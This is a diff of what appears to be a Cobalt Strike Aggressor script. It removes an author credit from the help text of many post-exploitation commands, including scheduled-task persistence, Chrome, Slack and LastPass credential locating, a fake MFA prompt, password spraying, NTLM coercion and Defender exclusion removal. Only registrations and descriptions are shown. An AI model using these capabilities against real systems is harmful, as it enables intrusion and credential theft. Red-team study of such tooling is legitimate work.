-# PHASE 5 — PERSISTENCE  (2 BOFs, by Dani)
+# PHASE 5 — PERSISTENCE  (2 BOFs)
 # ============================================================
 # ============================================================
 
@@ -1787,7 +1787,7 @@ alias schtask-com {
 }
 beacon_command_register(
     "schtask-com",
-    "Scheduled task persistence via COM — T1053.005 (by Dani)",
+    "Scheduled task persistence via COM — T1053.005",
     "Synopsis: schtask-com <name> <cmd> [trigger] [remove]\n\n" .
     "Description: Create a persistent scheduled task using the Task Scheduler\n" .
     "COM interface (ITaskService) — avoids schtasks.exe. Supports ONLOGON,\n" .
@@ -1819,7 +1819,7 @@ alias lnk-startup {
 }
 beacon_command_register(
     "lnk-startup",
-    "Startup folder LNK persistence via COM — T1547.001 (by Dani)",
+    "Startup folder LNK persistence via COM — T1547.001",
     "Synopsis: lnk-startup <name> <target> [args] [remove]\n\n" .
     "Description: Create a .lnk shortcut in the current user's Startup folder\n" .
     "using the IShellLink COM interface (avoids writing scripts or schtasks).\n" .
@@ -1870,7 +1870,7 @@ alias bofx {
 }
 beacon_command_register(
     "bofx",
-    "OPSEC-hardened BOF loader (InlineExecuteEx fork) — Phase 6 (by Dani)",
+    "OPSEC-hardened BOF loader (InlineExecuteEx fork) — Phase 6",
     "Synopsis: bofx <bof-path> [entry] [args]\n\n" .
     "Description: Load and execute an arbitrary BOF using an OPSEC-hardened\n" .
     "InlineExecuteEx fork. Supports ETW patching, sleep obfuscation, and\n" .
@@ -1892,7 +1892,7 @@ alias adcs-enum {
 }
 beacon_command_register(
     "adcs-enum",
-    "ADCS CA enumeration via registry — T1518.001 (by Dani)",
+    "ADCS CA enumeration via registry — T1518.001",
     "Synopsis: adcs-enum\n\nDescription: Walk HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Services\\CertSvc\\Configuration to enumerate Certificate Authority names and DNS hostnames without COM or certutil.\n\nMITRE ATT&CK: T1518.001\n\nArgs: none"
 );
 
@@ -1902,7 +1902,7 @@ alias adv-audit-policies {
 }
 beacon_command_register(
     "adv-audit-policies",
-    "Advanced audit policy enumeration — T1082 (by Dani)",
+    "Advanced audit policy enumeration — T1082",
     "Synopsis: adv-audit-policies\n\nDescription: Enumerate advanced audit policy settings from the registry without auditpol.exe.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -1912,7 +1912,7 @@ alias enum-local-sessions {
 }
 beacon_command_register(
     "enum-local-sessions",
-    "Enumerate local logon sessions — T1033 (by Dani)",
+    "Enumerate local logon sessions — T1033",
     "Synopsis: enum-local-sessions\n\nDescription: List active logon sessions via LsaEnumerateLogonSessions.\n\nMITRE ATT&CK: T1033\n\nArgs: none"
 );
 
@@ -1922,7 +1922,7 @@ alias get-session-info {
 }
 beacon_command_register(
     "get-session-info",
-    "RDP/console session info — T1033 (by Dani)",
+    "RDP/console session info — T1033",
     "Synopsis: get-session-info\n\nDescription: Enumerate RDP and console sessions via WTSEnumerateSessions.\n\nMITRE ATT&CK: T1033\n\nArgs: none"
 );
 
@@ -1932,7 +1932,7 @@ alias listdns {
 }
 beacon_command_register(
     "listdns",
-    "DNS client cache enumeration — T1016 (by Dani)",
+    "DNS client cache enumeration — T1016",
     "Synopsis: listdns\n\nDescription: Read DNS resolver cache entries from the registry.\n\nMITRE ATT&CK: T1016\n\nArgs: none"
 );
 
@@ -1942,7 +1942,7 @@ alias locale {
 }
 beacon_command_register(
     "locale",
-    "System locale and timezone — T1082 (by Dani)",
+    "System locale and timezone — T1082",
     "Synopsis: locale\n\nDescription: Read system locale, language, and timezone settings.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -1957,7 +1957,7 @@ alias md5 {
 }
 beacon_command_register(
     "md5",
-    "MD5 hash a file — T1082 (by Dani)",
+    "MD5 hash a file — T1082",
     "Synopsis: md5 <filepath>\n\nDescription: Compute MD5 hash of a file using CryptoAPI without CertUtil.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
 );
 
@@ -1967,7 +1967,7 @@ alias nettime {
 }
 beacon_command_register(
     "nettime",
-    "Domain time synchronization source — T1124 (by Dani)",
+    "Domain time synchronization source — T1124",
     "Synopsis: nettime\n\nDescription: Query domain time source via NetRemoteTOD.\n\nMITRE ATT&CK: T1124\n\nArgs: none"
 );
 
@@ -1977,7 +1977,7 @@ alias netuptime {
 }
 beacon_command_register(
     "netuptime",
-    "Network host uptime — T1082 (by Dani)",
+    "Network host uptime — T1082",
     "Synopsis: netuptime\n\nDescription: Get system uptime via KUSER_SHARED_DATA BootTime.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -1987,7 +1987,7 @@ alias netuse {
 }
 beacon_command_register(
     "netuse",
-    "Enumerate mapped network drives — T1135 (by Dani)",
+    "Enumerate mapped network drives — T1135",
     "Synopsis: netuse\n\nDescription: List currently connected network shares via NetUseEnum.\n\nMITRE ATT&CK: T1135\n\nArgs: none"
 );
 
@@ -1997,7 +1997,7 @@ alias netview {
 }
 beacon_command_register(
     "netview",
-    "Enumerate network computers — T1018 (by Dani)",
+    "Enumerate network computers — T1018",
     "Synopsis: netview\n\nDescription: List visible network computers in the domain via NetServerEnum.\n\nMITRE ATT&CK: T1018\n\nArgs: none"
 );
 
@@ -2007,7 +2007,7 @@ alias regsession {
 }
 beacon_command_register(
     "regsession",
-    "Registry session data — T1082 (by Dani)",
+    "Registry session data — T1082",
     "Synopsis: regsession\n\nDescription: Read session-related registry data.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -2017,7 +2017,7 @@ alias resources {
 }
 beacon_command_register(
     "resources",
-    "System resources (CPU/memory/disk) — T1082 (by Dani)",
+    "System resources (CPU/memory/disk) — T1082",
     "Synopsis: resources\n\nDescription: Report CPU count, total/available physical memory and disk space.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -2027,7 +2027,7 @@ alias sc-enum {
 }
 beacon_command_register(
     "sc-enum",
-    "Service enumeration — T1007 (by Dani)",
+    "Service enumeration — T1007",
     "Synopsis: sc-enum\n\nDescription: Enumerate all services via EnumServicesStatusExA.\n\nMITRE ATT&CK: T1007\n\nArgs: none"
 );
 
@@ -2041,7 +2041,7 @@ alias sc-qc {
 }
 beacon_command_register(
     "sc-qc",
-    "Service configuration query — T1007 (by Dani)",
+    "Service configuration query — T1007",
     "Synopsis: sc-qc <service-name>\n\nDescription: Query service configuration via QueryServiceConfigA.\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
 );
 
@@ -2055,7 +2055,7 @@ alias sc-qdescription {
 }
 beacon_command_register(
     "sc-qdescription",
-    "Service description query — T1007 (by Dani)",
+    "Service description query — T1007",
     "Synopsis: sc-qdescription <service-name>\n\nDescription: Query service description string via QueryServiceConfig2A.\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
 );
 
@@ -2069,7 +2069,7 @@ alias sc-qfailure {
 }
 beacon_command_register(
     "sc-qfailure",
-    "Service failure actions query — T1007 (by Dani)",
+    "Service failure actions query — T1007",
     "Synopsis: sc-qfailure <service-name>\n\nDescription: Query service failure recovery actions via QueryServiceConfig2A(SC_ACTION).\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
 );
 
@@ -2083,7 +2083,7 @@ alias sc-qtriggerinfo {
 }
 beacon_command_register(
     "sc-qtriggerinfo",
-    "Service trigger info query — T1007 (by Dani)",
+    "Service trigger info query — T1007",
     "Synopsis: sc-qtriggerinfo <service-name>\n\nDescription: Query service trigger information (start/stop conditions).\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
 );
 
@@ -2097,7 +2097,7 @@ alias sha1 {
 }
 beacon_command_register(
     "sha1",
-    "SHA1 hash a file — T1082 (by Dani)",
+    "SHA1 hash a file — T1082",
     "Synopsis: sha1 <filepath>\n\nDescription: Compute SHA1 hash of a file using CryptoAPI.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
 );
 
@@ -2111,7 +2111,7 @@ alias sha256 {
 }
 beacon_command_register(
     "sha256",
-    "SHA256 hash a file — T1082 (by Dani)",
+    "SHA256 hash a file — T1082",
     "Synopsis: sha256 <filepath>\n\nDescription: Compute SHA256 hash of a file using CryptoAPI.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
 );
 
@@ -2121,7 +2121,7 @@ alias vssenum {
 }
 beacon_command_register(
     "vssenum",
-    "VSS shadow copy enumeration — T1003.003 (by Dani)",
+    "VSS shadow copy enumeration — T1003.003",
     "Synopsis: vssenum\n\nDescription: Enumerate Volume Shadow Copies via registry/WMI.\n\nMITRE ATT&CK: T1003.003\n\nArgs: none"
 );
 
@@ -2139,7 +2139,7 @@ alias processdestroy {
 }
 beacon_command_register(
     "processdestroy",
-    "Terminate a process by PID or name — T1562.001 (by Dani)",
+    "Terminate a process by PID or name — T1562.001",
     "Synopsis: processdestroy <pid-or-name>\n\nDescription: Terminate a process using TerminateProcess. Accepts numeric PID or process name (Toolhelp32 walk).\n\nMITRE ATT&CK: T1562.001\n\nArgs: <pid-or-name>"
 );
 
@@ -2149,7 +2149,7 @@ alias processlisthandles {
 }
 beacon_command_register(
     "processlisthandles",
-    "Enumerate all process handles — T1106 (by Dani)",
+    "Enumerate all process handles — T1106",
     "Synopsis: processlisthandles\n\nDescription: x64-only. List all open handles system-wide via NtQuerySystemInformation(SystemHandleInformation).\n\nMITRE ATT&CK: T1106\n\nArgs: none"
 );
 
@@ -2164,7 +2164,7 @@ alias reg-delete {
 }
 beacon_command_register(
     "reg-delete",
-    "Delete a registry value or key — T1112 (by Dani)",
+    "Delete a registry value or key — T1112",
     "Synopsis: reg-delete <hive> <subkey> [value]\n\nDescription: Delete a registry value (if value given) or empty subkey (no value).\n\nMITRE ATT&CK: T1112\n\nArgs: <hive> <subkey> [value]"
 );
 
@@ -2181,7 +2181,7 @@ alias reg-set {
 }
 beacon_command_register(
     "reg-set",
-    "Create/set a registry value — T1112 (by Dani)",
+    "Create/set a registry value — T1112",
     "Synopsis: reg-set <hive> <subkey> <value> <type> <data>\n\nDescription: Create or set REG_SZ, REG_DWORD, or REG_BINARY registry values.\n\nMITRE ATT&CK: T1112\n\nArgs: <hive> <subkey> <value> <REG_SZ|REG_DWORD|REG_BINARY> <data>"
 );
 
@@ -2196,7 +2196,7 @@ alias sc-config {
 }
 beacon_command_register(
     "sc-config",
-    "Change service start type — T1543.003 (by Dani)",
+    "Change service start type — T1543.003",
     "Synopsis: sc-config <name> <auto|demand|disabled|boot|system> [binpath]\n\nDescription: Modify service start type and optionally the binary path via ChangeServiceConfigA.\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name> <start-type> [binpath]"
 );
 
@@ -2210,7 +2210,7 @@ alias sc-description {
 }
 beacon_command_register(
     "sc-description",
-    "Set service description string — T1543.003 (by Dani)",
+    "Set service description string — T1543.003",
     "Synopsis: sc-description <name> <description>\n\nDescription: Set the service description string via ChangeServiceConfig2A.\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name> <description>"
 );
 
@@ -2224,7 +2224,7 @@ alias sc-failure {
 }
 beacon_command_register(
     "sc-failure",
-    "Set service failure recovery actions — T1543.003 (by Dani)",
+    "Set service failure recovery actions — T1543.003",
     "Synopsis: sc-failure <service-name>\n\nDescription: Configure service failure actions (restart on failure).\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name>"
 );
 
@@ -2238,7 +2238,7 @@ alias sc-start {
 }
 beacon_command_register(
     "sc-start",
-    "Start a service — T1569.002 (by Dani)",
+    "Start a service — T1569.002",
     "Synopsis: sc-start <service-name>\n\nDescription: Start a service via StartServiceA.\n\nMITRE ATT&CK: T1569.002\n\nArgs: <service-name>"
 );
 
@@ -2252,7 +2252,7 @@ alias sc-stop {
 }
 beacon_command_register(
     "sc-stop",
-    "Stop a service — T1489 (by Dani)",
+    "Stop a service — T1489",
     "Synopsis: sc-stop <service-name>\n\nDescription: Stop a running service via ControlService(SERVICE_CONTROL_STOP).\n\nMITRE ATT&CK: T1489\n\nArgs: <service-name>"
 );
 
@@ -2266,7 +2266,7 @@ alias shutdown {
 }
 beacon_command_register(
     "shutdown",
-    "Shutdown/reboot/logoff — T1529 (by Dani)",
+    "Shutdown/reboot/logoff — T1529",
     "Synopsis: shutdown [s|r|l|f]\n\nDescription: Initiate shutdown (s), reboot (r), logoff (l), or forced (f) after acquiring SeShutdownPrivilege.\n\nMITRE ATT&CK: T1529\n\nArgs: [s|r|l|f] (default: s)"
 );
 
@@ -2276,7 +2276,7 @@ alias conhost {
 }
 beacon_command_register(
     "conhost",
-    "Enumerate conhost.exe processes — T1057 (by Dani)",
+    "Enumerate conhost.exe processes — T1057",
     "Synopsis: conhost\n\nDescription: List all conhost.exe PIDs and their parent PIDs via Toolhelp32 snapshot.\n\nMITRE ATT&CK: T1057\n\nArgs: none"
 );
 
@@ -2290,7 +2290,7 @@ alias svcctrl {
 }
 beacon_command_register(
     "svcctrl",
-    "Service start/stop/pause/continue controller — T1489/T1569.002 (by Dani)",
+    "Service start/stop/pause/continue controller — T1489/T1569.002",
     "Synopsis: svcctrl <start|stop|pause|continue> <service-name>\n\nDescription: Control service state via SCM ControlService/StartServiceA.\n\nMITRE ATT&CK: T1489, T1569.002\n\nArgs: <action> <service-name>"
 );
 
@@ -2300,7 +2300,7 @@ alias ctray {
 }
 beacon_command_register(
     "ctray",
-    "Enumerate system tray windows — T1082 (by Dani)",
+    "Enumerate system tray windows — T1082",
     "Synopsis: ctray\n\nDescription: Enumerate Shell_TrayWnd and system tray child windows via user32 API.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -2310,7 +2310,7 @@ alias dde {
 }
 beacon_command_register(
     "dde",
-    "Check Office DDE registry entries — T1559.002 (by Dani)",
+    "Check Office DDE registry entries — T1559.002",
     "Synopsis: dde\n\nDescription: Check HKCU\\Software\\Microsoft\\Office subkeys for DDE-related configuration.\n\nMITRE ATT&CK: T1559.002\n\nArgs: none"
 );
 
@@ -2320,7 +2320,7 @@ alias tooltip {
 }
 beacon_command_register(
     "tooltip",
-    "Enumerate tooltips_class32 windows — T1010 (by Dani)",
+    "Enumerate tooltips_class32 windows — T1010",
     "Synopsis: tooltip\n\nDescription: Enumerate tooltips_class32 windows via FindWindowExA to map visible UI state.\n\nMITRE ATT&CK: T1010\n\nArgs: none"
 );
 
@@ -2330,7 +2330,7 @@ alias uxsubclassinfo {
 }
 beacon_command_register(
     "uxsubclassinfo",
-    "Check UxSubclassInfo window hooks — T1055 (by Dani)",
+    "Check UxSubclassInfo window hooks — T1055",
     "Synopsis: uxsubclassinfo\n\nDescription: Check Shell_TrayWnd and Progman windows for UxSubclassInfo/CC32SubclassInfo properties that indicate EDR/AV window subclassing hooks.\n\nMITRE ATT&CK: T1055\n\nArgs: none"
 );
 
@@ -2344,7 +2344,7 @@ alias setthreadcontext {
 }
 beacon_command_register(
     "setthreadcontext",
-    "Enumerate threads and show RIP — T1055.003 (by Dani)",
+    "Enumerate threads and show RIP — T1055.003",
     "Synopsis: setthreadcontext <pid>\n\nDescription: x64-only. Enumerate thread IDs for a process and show first thread's RIP via GetThreadContext.\n\nMITRE ATT&CK: T1055.003\n\nArgs: <pid>"
 );
 
@@ -2354,7 +2354,7 @@ alias slack-cookie {
 }
 beacon_command_register(
     "slack-cookie",
-    "Enumerate Slack AppData for cookie artifacts — T1539 (by Dani)",
+    "Enumerate Slack AppData for cookie artifacts — T1539",
     "Synopsis: slack-cookie\n\nDescription: List %APPDATA%\\Slack\\ directory contents to identify cookie and session files.\n\nMITRE ATT&CK: T1539\n\nArgs: none"
 );
 
@@ -2364,7 +2364,7 @@ alias slackkey {
 }
 beacon_command_register(
     "slackkey",
-    "Read Slack Local State DPAPI key — T1539 (by Dani)",
+    "Read Slack Local State DPAPI key — T1539",
     "Synopsis: slackkey\n\nDescription: Read first 4096 bytes of %APPDATA%\\Slack\\Local State for DPAPI-encrypted master key.\n\nMITRE ATT&CK: T1539\n\nArgs: none"
 );
 
@@ -2374,7 +2374,7 @@ alias chromekey {
 }
 beacon_command_register(
     "chromekey",
-    "Read Chrome Local State DPAPI key — T1555.003 (by Dani)",
+    "Read Chrome Local State DPAPI key — T1555.003",
     "Synopsis: chromekey\n\nDescription: Read first 1024 bytes of %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State.\n\nMITRE ATT&CK: T1555.003\n\nArgs: none"
 );
 
@@ -2384,7 +2384,7 @@ alias office-tokens {
 }
 beacon_command_register(
     "office-tokens",
-    "Enumerate Office/MSAL token cache paths — T1528 (by Dani)",
+    "Enumerate Office/MSAL token cache paths — T1528",
     "Synopsis: office-tokens\n\nDescription: List Office identity token cache directories under %LOCALAPPDATA%.\n\nMITRE ATT&CK: T1528\n\nArgs: none"
 );
 
@@ -2394,7 +2394,7 @@ alias lastpass {
 }
 beacon_command_register(
     "lastpass",
-    "Locate LastPass credential storage — T1555.003 (by Dani)",
+    "Locate LastPass credential storage — T1555.003",
     "Synopsis: lastpass\n\nDescription: Find LastPass Chrome extension LDB files and %APPDATA%\\LastPass directory.\n\nMITRE ATT&CK: T1555.003\n\nArgs: none"
 );
 
@@ -2404,7 +2404,7 @@ alias get-azure-token {
 }
 beacon_command_register(
     "get-azure-token",
-    "Enumerate Azure/MSAL token cache paths — T1528 (by Dani)",
+    "Enumerate Azure/MSAL token cache paths — T1528",
     "Synopsis: get-azure-token\n\nDescription: Enumerate Azure TokenBroker and MSAL cache directories under %LOCALAPPDATA%.\n\nMITRE ATT&CK: T1528\n\nArgs: none"
 );
 
@@ -2419,7 +2419,7 @@ alias ask-mfa {
 }
 beacon_command_register(
     "ask-mfa",
-    "Fake MFA credential prompt — T1056.002 (by Dani)",
+    "Fake MFA credential prompt — T1056.002",
     "Synopsis: ask-mfa [caption] [message]\n\nDescription: Display a fake Windows credential prompt via CredUIPromptForWindowsCredentialsA to capture typed credentials.\n\nMITRE ATT&CK: T1056.002\n\nArgs: [caption] [message]"
 );
 
@@ -2429,7 +2429,7 @@ alias adcs-request {
 }
 beacon_command_register(
     "adcs-request",
-    "Enumerate ADCS CA from registry — T1649 (by Dani)",
+    "Enumerate ADCS CA from registry — T1649",
     "Synopsis: adcs-request\n\nDescription: Read CertSvc registry key to enumerate CA configuration for certificate request targeting.\n\nMITRE ATT&CK: T1649\n\nArgs: none"
 );
 
@@ -2439,7 +2439,7 @@ alias adcs-request-on-behalf {
 }
 beacon_command_register(
     "adcs-request-on-behalf",
-    "Check ESC3 enrollment agent feasibility — T1649 (by Dani)",
+    "Check ESC3 enrollment agent feasibility — T1649",
     "Synopsis: adcs-request-on-behalf\n\nDescription: Check HKCU autoenrollment and local CertSvc CA for ESC3 enrollment agent certificate abuse.\n\nMITRE ATT&CK: T1649\n\nArgs: none"
 );
 
@@ -2460,7 +2460,7 @@ alias add-firewall-rule {
 }
 beacon_command_register(
     "add-firewall-rule",
-    "Add Windows Firewall rule via registry — T1562.004 (by Dani)",
+    "Add Windows Firewall rule via registry — T1562.004",
     "Synopsis: add-firewall-rule <name> <in|out> <TCP|UDP|*> <port>\n\nDescription: Write a firewall allow rule directly to the registry.\n\nMITRE ATT&CK: T1562.004\n\nArgs: <name> <in|out> <TCP|UDP|*> <port>"
 );
 
@@ -2474,7 +2474,7 @@ alias del-firewall-rule {
 }
 beacon_command_register(
     "del-firewall-rule",
-    "Delete Windows Firewall rule — T1562.004 (by Dani)",
+    "Delete Windows Firewall rule — T1562.004",
     "Synopsis: del-firewall-rule <name>\n\nDescription: Delete a firewall rule by name from the registry.\n\nMITRE ATT&CK: T1562.004\n\nArgs: <name>"
 );
 
@@ -2488,7 +2488,7 @@ alias add-local-cert {
 }
 beacon_command_register(
     "add-local-cert",
-    "Add certificate to local store — T1553.004 (by Dani)",
+    "Add certificate to local store — T1553.004",
     "Synopsis: add-local-cert <store-name> <cert-path>\n\nDescription: Import a DER certificate into a local Windows cert store via CertAddEncodedCertificateToStore.\n\nMITRE ATT&CK: T1553.004\n\nArgs: <store> <cert-path>"
 );
 
@@ -2502,7 +2502,7 @@ alias del-local-cert {
 }
 beacon_command_register(
     "del-local-cert",
-    "Delete certificate from local store — T1553.004 (by Dani)",
+    "Delete certificate from local store — T1553.004",
     "Synopsis: del-local-cert <store> <sha1-thumbprint>\n\nDescription: Delete a certificate from a Windows cert store matching the given SHA1 thumbprint.\n\nMITRE ATT&CK: T1553.004\n\nArgs: <store> <sha1-thumbprint>"
 );
 
@@ -2512,7 +2512,7 @@ alias enum-local-cert {
 }
 beacon_command_register(
     "enum-local-cert",
-    "Enumerate local certificate stores — T1552.004 (by Dani)",
+    "Enumerate local certificate stores — T1552.004",
     "Synopsis: enum-local-cert\n\nDescription: List certificates in MY, ROOT, CA, and TRUST stores via CertEnumCertificatesInStore.\n\nMITRE ATT&CK: T1552.004\n\nArgs: none"
 );
 
@@ -2527,7 +2527,7 @@ alias add-task-scheduler {
 }
 beacon_command_register(
     "add-task-scheduler",
-    "Add scheduled task via COM — T1053.005 (by Dani)",
+    "Add scheduled task via COM — T1053.005",
     "Synopsis: add-task-scheduler <name> <command> [trigger]\n\nDescription: Register a scheduled task via ITaskService COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: <name> <command> [trigger=ONLOGON]"
 );
 
@@ -2541,7 +2541,7 @@ alias del-task-scheduler {
 }
 beacon_command_register(
     "del-task-scheduler",
-    "Delete scheduled task via COM — T1053.005 (by Dani)",
+    "Delete scheduled task via COM — T1053.005",
     "Synopsis: del-task-scheduler <task-name>\n\nDescription: Delete a scheduled task via ITaskFolder::DeleteTask COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: <task-name>"
 );
 
@@ -2555,7 +2555,7 @@ alias del-exclusion {
 }
 beacon_command_register(
     "del-exclusion",
-    "Remove Defender exclusion — T1562.001 (by Dani)",
+    "Remove Defender exclusion — T1562.001",
     "Synopsis: del-exclusion <path|extension|process> <value>\n\nDescription: Delete an AV exclusion from the Windows Defender registry hive.\n\nMITRE ATT&CK: T1562.001\n\nArgs: <path|extension|process> <value>"
 );
 
@@ -2569,7 +2569,7 @@ alias hide-file {
 }
 beacon_command_register(
     "hide-file",
-    "Set file hidden+system attributes — T1564.001 (by Dani)",
+    "Set file hidden+system attributes — T1564.001",
     "Synopsis: hide-file <path>\n\nDescription: Apply HIDDEN|SYSTEM|NOT_CONTENT_INDEXED attributes to a file.\n\nMITRE ATT&CK: T1564.001\n\nArgs: <path>"
 );
 
@@ -2583,7 +2583,7 @@ alias password-spray-ad {
 }
 beacon_command_register(
     "password-spray-ad",
-    "AD password spray via LogonUserA — T1110.003 (by Dani)",
+    "AD password spray via LogonUserA — T1110.003",
     "Synopsis: password-spray-ad <user1,user2,...> <password>\n\nDescription: Test a single password against comma-separated AD usernames using network logon (no lockout from single credential).\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
 );
 
@@ -2597,7 +2597,7 @@ alias password-spray-local {
 }
 beacon_command_register(
     "password-spray-local",
-    "Local password spray via LogonUserA — T1110.003 (by Dani)",
+    "Local password spray via LogonUserA — T1110.003",
     "Synopsis: password-spray-local <user1,user2,...> <password>\n\nDescription: Test a single password against comma-separated local account names.\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
 );
 
@@ -2611,7 +2611,7 @@ alias enum-active-hosts {
 }
 beacon_command_register(
     "enum-active-hosts",
-    "Ping sweep /24 via IcmpSendEcho — T1018 (by Dani)",
+    "Ping sweep /24 via IcmpSendEcho — T1018",
     "Synopsis: enum-active-hosts <subnet-prefix>\n\nDescription: Sweep a /24 subnet using icmp.dll IcmpSendEcho.\n\nMITRE ATT&CK: T1018\n\nArgs: <x.x.x> subnet prefix (e.g. 192.168.1)"
 );
 
@@ -2621,7 +2621,7 @@ alias enum-dll-sideloading {
 }
 beacon_command_register(
     "enum-dll-sideloading",
-    "Enumerate non-system-dir loaded DLLs — T1574.002 (by Dani)",
+    "Enumerate non-system-dir loaded DLLs — T1574.002",
     "Synopsis: enum-dll-sideloading\n\nDescription: List loaded DLLs outside system directories as sideloading candidates.\n\nMITRE ATT&CK: T1574.002\n\nArgs: none"
 );
 
@@ -2631,7 +2631,7 @@ alias enum-drives {
 }
 beacon_command_register(
     "enum-drives",
-    "Enumerate logical drives — T1083 (by Dani)",
+    "Enumerate logical drives — T1083",
     "Synopsis: enum-drives\n\nDescription: List all logical drives with type, free space, and total size.\n\nMITRE ATT&CK: T1083\n\nArgs: none"
 );
 
@@ -2641,7 +2641,7 @@ alias enum-exclusions {
 }
 beacon_command_register(
     "enum-exclusions",
-    "Enumerate Defender exclusions — T1562.001 (by Dani)",
+    "Enumerate Defender exclusions — T1562.001",
     "Synopsis: enum-exclusions\n\nDescription: List all Defender path, extension, and process exclusions from the registry.\n\nMITRE ATT&CK: T1562.001\n\nArgs: none"
 );
 
@@ -2655,7 +2655,7 @@ alias enum-files {
 }
 beacon_command_register(
     "enum-files",
-    "BFS file enumeration — T1083 (by Dani)",
+    "BFS file enumeration — T1083",
     "Synopsis: enum-files [path]\n\nDescription: Enumerate files from a path BFS up to depth 5, max 200 entries.\n\nMITRE ATT&CK: T1083\n\nArgs: [path] (default: .)"
 );
 
@@ -2665,7 +2665,7 @@ alias enum-handles {
 }
 beacon_command_register(
     "enum-handles",
-    "System-wide handle enumeration — T1106 (by Dani)",
+    "System-wide handle enumeration — T1106",
     "Synopsis: enum-handles\n\nDescription: x64-only. Enumerate all system handles via NtQuerySystemInformation(SystemHandleInformation).\n\nMITRE ATT&CK: T1106\n\nArgs: none"
 );
 
@@ -2675,7 +2675,7 @@ alias enum-lib {
 }
 beacon_command_register(
     "enum-lib",
-    "Process module list — T1057 (by Dani)",
+    "Process module list — T1057",
     "Synopsis: enum-lib\n\nDescription: Enumerate loaded modules for the current process via Module32First/Next.\n\nMITRE ATT&CK: T1057\n\nArgs: none"
 );
 
@@ -2685,7 +2685,7 @@ alias dll-env-hijacking {
 }
 beacon_command_register(
     "dll-env-hijacking",
-    "Check writable PATH dirs for DLL hijacking — T1574.007 (by Dani)",
+    "Check writable PATH dirs for DLL hijacking — T1574.007",
     "Synopsis: dll-env-hijacking\n\nDescription: Probe each PATH directory for write access as a DLL planting candidate.\n\nMITRE ATT&CK: T1574.007\n\nArgs: none"
 );
 
@@ -2695,7 +2695,7 @@ alias enum-task-scheduler {
 }
 beacon_command_register(
     "enum-task-scheduler",
-    "Enumerate scheduled tasks via COM — T1053.005 (by Dani)",
+    "Enumerate scheduled tasks via COM — T1053.005",
     "Synopsis: enum-task-scheduler\n\nDescription: List scheduled tasks with name, path, and enabled state via ITaskService COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: none"
 );
 
@@ -2709,7 +2709,7 @@ alias enum-shares {
 }
 beacon_command_register(
     "enum-shares",
-    "Enumerate network shares — T1135 (by Dani)",
+    "Enumerate network shares — T1135",
     "Synopsis: enum-shares [\\\\server]\n\nDescription: List shares via NetShareEnum level 1. Defaults to localhost.\n\nMITRE ATT&CK: T1135\n\nArgs: [\\\\server] (optional)"
 );
 
@@ -2719,7 +2719,7 @@ alias force-lock-screen {
 }
 beacon_command_register(
     "force-lock-screen",
-    "Force workstation lock — T1531 (by Dani)",
+    "Force workstation lock — T1531",
     "Synopsis: force-lock-screen\n\nDescription: Lock the workstation via LockWorkStation.\n\nMITRE ATT&CK: T1531\n\nArgs: none"
 );
 
@@ -2729,7 +2729,7 @@ alias enum-web-client {
 }
 beacon_command_register(
     "enum-web-client",
-    "Check WebClient service and proxy — T1135 (by Dani)",
+    "Check WebClient service and proxy — T1135",
     "Synopsis: enum-web-client\n\nDescription: Check WebClient service status and WinHTTP proxy configuration.\n\nMITRE ATT&CK: T1135\n\nArgs: none"
 );
 
@@ -2747,7 +2747,7 @@ alias add-machine-account {
 }
 beacon_command_register(
     "add-machine-account",
-    "Add AD machine account — T1136.002 (by Dani)",
+    "Add AD machine account — T1136.002",
     "Synopsis: add-machine-account <name> <password>\n\nDescription: Create an AD machine account via NetUserAdd with WORKSTATION_TRUST_ACCOUNT.\n\nMITRE ATT&CK: T1136.002\n\nArgs: <name> <password>"
 );
 
@@ -2762,7 +2762,7 @@ alias petit-potam {
 }
 beacon_command_register(
     "petit-potam",
-    "SMB NTLM coercion via UNC path — T1187 (by Dani)",
+    "SMB NTLM coercion via UNC path — T1187",
     "Synopsis: petit-potam <listener-ip> [share]\n\nDescription: Trigger NTLM authentication coercion by opening a UNC path to attacker-controlled listener.\n\nMITRE ATT&CK: T1187\n\nArgs: <listener-ip> [share]"
 );
 
@@ -2776,7 +2776,7 @@ alias spray-ad {
 }
 beacon_command_register(
     "spray-ad",
-    "AD password spray with auto domain — T1110.003 (by Dani)",
+    "AD password spray with auto domain — T1110.003",
     "Synopsis: spray-ad <user1,user2,...> <password>\n\nDescription: Spray a password against AD accounts; auto-discovers domain via GetComputerNameExA.\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
 );
 
@@ -2786,7 +2786,7 @@ alias start-web-client {
 }
 beacon_command_register(
     "start-web-client",
-    "Start WebClient service — T1021.002 (by Dani)",
+    "Start WebClient service — T1021.002",
     "Synopsis: start-web-client\n\nDescription: Start the WebDAV WebClient service via SCM if not already running.\n\nMITRE ATT&CK: T1021.002\n\nArgs: none"
 );
 
@@ -2796,7 +2796,7 @@ alias winver {
 }
 beacon_command_register(
     "winver",
-    "Full OS/hardware info — T1082 (by Dani)",
+    "Full OS/hardware info — T1082",
     "Synopsis: winver\n\nDescription: Report OS version (RtlGetVersion), arch, username, and hostname.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
 );
 
@@ -2810,7 +2810,7 @@ alias dani-help {
     local('$bid');
     $bid = $1;
     blog($bid, "=================================================================");
